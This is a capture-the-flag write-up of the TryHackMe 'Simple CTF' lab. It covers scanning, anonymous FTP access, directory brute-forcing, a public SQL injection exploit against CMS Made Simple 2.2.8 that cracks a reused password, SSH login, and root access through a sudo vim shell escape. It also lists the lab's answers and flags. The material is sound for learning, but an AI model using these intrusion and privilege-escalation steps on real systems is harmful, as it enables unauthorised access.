# [Simple CTF] - Writeup

**Platform:** TryHackMe
**Difficulty:** Easy
**Date Completed:** [03.08.2025]  
**Skills Used:** [Web exploitation, SQL injection, Privilege escalation]  
**Tools Used:** [Nmap, Gobuster]

## Executive Summary

Successfully compromised a Linux web server by exploiting a SQL injection vulnerability (CVE-2019-9053) in CMS Made Simple v2.2.8 to obtain user credentials, then escalated privileges through misconfigured sudo permissions. The attack chain involved FTP enumeration for reconnaissance hints, automated SQL injection to crack password hashes, SSH access with reused credentials, and privilege escalation via vim sudo access to achieve full system compromise.

## Initial Reconnaissance

### Port Scanning

We run our first scan using nmap with the TCP SYN and aggressive options (we don't care about being detected here).

```bash
sudo nmap -sS -A 10.10.191.71
Starting Nmap 7.80 ( https://nmap.org ) at 2025-08-03 18:41 CEST
Nmap scan report for 10.10.191.71
Host is up (0.089s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.21.205.7
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries
|_/ /openemr-5_0_1_3
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (92%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Adtran 424RG FTTH gateway (86%), Linux 2.6.32 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   93.83 ms 10.21.0.1
2   93.86 ms 10.10.191.71

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.84 seconds
```

**Results:**

- Port 21: FTP
- Port 80: HTTP
- Port 2222: SSH

This allows us to answer the first 2 questions :

1. How many services are running under port 1000? 2
2. What is running on the higher port? SSH

## Vulnerability Analysis

We will now try to find a vulnerability on the target machine. My first idea is to check out the content of the file robots.txt that our nmap scan found.

```bash
curl http://10.10.191.71/robots.txt
#
# "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $"
#
#   This file tells search engines not to index your CUPS server.
#
#   Copyright 1993-2003 by Easy Software Products.
#
#   These coded instructions, statements, and computer programs are the
#   property of Easy Software Products and are protected by Federal
#   copyright law.  Distribution and use rights are outlined in the file
#   "LICENSE.txt" which should have been included with this file.  If this
#   file is missing or damaged please contact Easy Software Products
#   at:
#
#       Attn: CUPS Licensing Information
#       Easy Software Products
#       44141 Airport View Drive, Suite 204
#       Hollywood, Maryland 20636-3111 USA
#
#       Voice: (301) 373-9600
#       EMail: cups-info@cups.org
#         WWW: http://www.cups.org
#

User-agent: *
Disallow: /


Disallow: /openemr-5_0_1_3
#
# End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".

```

This suggests the existence of a hidden directory : /openemr-5_0_1_3 (It was already shown in the scan but I didn't notice it at first). But when I try to check out its contents, I get a 404 error. I still tried to search openemr on metasploit and to run the potentially matching exploits, but none were conclusive so I will spare the details to the reader.

My next idea is to try and see if I can use the ftp port. I saw online that some files could be accessible via a public "anonymous" account, so I tried to login this way and.. there was indeed an anonymous account :)

```bash
ftp 10.10.50.154
Connected to 10.10.50.154.
220 (vsFTPd 3.0.3)
Name (10.10.50.154:armould): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Next step is to explore the filesystem.

```bash
ls -la
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Aug 17  2019 .
drwxr-xr-x    3 ftp      ftp          4096 Aug 17  2019 ..
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls -la
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 .
drwxr-xr-x    3 ftp      ftp          4096 Aug 17  2019 ..
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
```

The only file is ForMitch.txt, which contains this text :

```bash
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!

```

Seems like a hint that heavily suggests that the system password might not be the most secure ! I tried bruteforcing the ssh port with hydra and usernames like root or admin but it did not work, so I will try to find other hints on the http port.
I am going to use gobuster in order to find potential directories existing in the website.

```bash
gobuster -u http://10.10.50.154 -w /home/armould/directory-list-2.3-small.txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.50.154/
[+] Threads      : 10
[+] Wordlist     : /home/armould/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2025/08/17 23:09:41 Starting gobuster
=====================================================
/simple (Status: 301)
Progress: 60080 / 87665 (68.53%)^C
```

This page is the default "CMS made simple" page, which is a tool for building and managing websites. At the bottom of the page, it is said that this is the 2.2.8 version -> might come in handy. I will try to see if i can find an exploit related to this management system :)

On exploit-db.com there is quite a few exploits for this software, but only one that matches this version : it is CVE-2019-9053, a SQL injection exploit.

This finally allows us to answer the next questions :  
3. What's the CVE you're using against the application? CVE-2019-9053  
4. To what kind of vulnerability is the application vulnerable? SQLI (For SQL injection)

I downloaded the exploit from exploit-db and ran it with rockyou.txt as a wordlist and magic : We got some credentials :)

```bash
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret

```

Moreover these are Mitch's credentials, and we found out earlier that Mitch tends to reuse his questionable password.  
5. What's the password? secret  
And the most obvious thing to do now is to try and connect via ssh to the server using mitch's credentials.  
6. Where can you login with the details obtained? ssh

I am indeed able to connect via ssh, and the user flag is there :

```bash
ssh mitch@10.10.168.38 -p 2222
The authenticity of host '[10.10.168.38]:2222 ([10.10.168.38]:2222)' can't be established.
ED25519 key fingerprint is SHA256:iq4f0XcnA5nnPNAufEqOpvTbO8dOJPcHGgmeABEdQ5g.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:14: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.168.38]:2222' (ED25519) to the list of known hosts.
mitch@10.10.168.38's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ ls
user.txt
$ cat user.txt
G00d j0b, keep up!
```

7. What's the user flag? G00d j0b, keep up!

Just by running `bash cd ..`, we can also answer to question 8: 8. Is there any other user in the home directory? What's its name? sunbath (a bit peculiar but why not)

## Privilege Escalation

To try to get root access, my first idea (and the only way that I have learned so far o_O) was to run sudo -l in order to see what commands my user could run as root. Luckily enough, there was one : vim. By looking the software up on GTFOBins, I found this command to escalate :

```bash
sudo vim -c ':!/bin/sh'
```

The -c option makes the program run the following command after opening a file. Here we did not provide any file name, so I think that it just runs the command directly (with root permission !). And because the command is simply opening a new shell, we end up with root access !

Root tag : W3ll d0n3. You made it!

---

[Arnaud Rajon]
